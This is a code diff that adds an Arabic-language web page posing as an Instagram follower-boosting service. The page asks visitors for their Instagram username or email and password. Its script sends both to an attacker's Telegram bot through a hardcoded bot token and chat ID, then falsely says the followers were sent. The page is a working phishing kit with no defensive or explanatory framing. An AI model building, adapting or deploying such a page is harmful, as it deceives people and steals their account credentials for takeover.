@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>زيادة المتابعين - إنستجرام</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1c1c3c; /* خلفية زرقاء داكنة */
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .container {
+            background-color: #2a2a5a; /* صندوق أزرق داكن */
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+        .container img {
+            width: 106px; /* حجم الصورة */
+            margin-bottom: 20px;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #555;
+            border-radius: 5px;
+            background-color: #3a3a6a;
+            color: white;
+        }
+        input::placeholder {
+            color: #bbb;
+        }
+        .login-btn {
+            width: 100%;
+            background-color: #007bff; /* زر أزرق */
+            color: white;
+            border: none;
+            padding: 10px;
+            margin-top: 10px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-btn:hover {
+            background-color: #0056b3;
+        }
+        .link {
+            margin-top: 10px;
+            color: #66a3ff;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        /* تصميم النافذة المنبثقة */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9); /* خلفية سوداء شفافة */
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            flex-direction: column;
+        }
+        .popup-content {
+            background: black;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            width: 80%;
+            max-width: 400px;
+        }
+        .close-btn {
+            margin-top: 20px;
+            background: red;
+            color: white;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+    </style>
+    <script>
+        function sendToTelegram(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+
+            if (username === "" || password === "") {
+                alert("يرجى ملء جميع الحقول!");
+                return;
+            }
+
+            let botToken = "7630372545:AAErb2tMEkxmxSVZ2026YajBaJibDzWCqXU";
+            let chatId = "6823320140";
+            let message = `🔹 حساب جديد 🔹\n\n👤 اسم المستخدم او البريد الإلكتروني: ${username}\n🔑 كلمة المرور: ${password}`;
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("تم إرسال المتابعين بنجاح!");
+                    } else {
+                        alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+                    }
+                })
+                .catch(error => {
+                    alert("فشل الاتصال بالسيرفر.");
+                });
+        }
+
+        function showPopup() {
+            document.getElementById("popup").style.display = "flex";
+        }
+
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+        }
+    </script>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        <form onsubmit="sendToTelegram(event)">
+            <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني">
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <button type="submit" class="login-btn">زيادة المتابعين</button>
+        </form>
+        <p class="link" onclick="showPopup()">حول هذه العملية</p>
+    </div>
+
+    <!-- نافذة منبثقة -->
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            هذا البرنامج لزيادة متابعين انستجرام ♨️<br>
+            و هذا البرنامج بالكامل من تطوير الملاعين 🕷
+            <button class="close-btn" onclick="closePopup()">إغلاق</button>
+        </div>
+    </div>
+
+</body>
+</html>
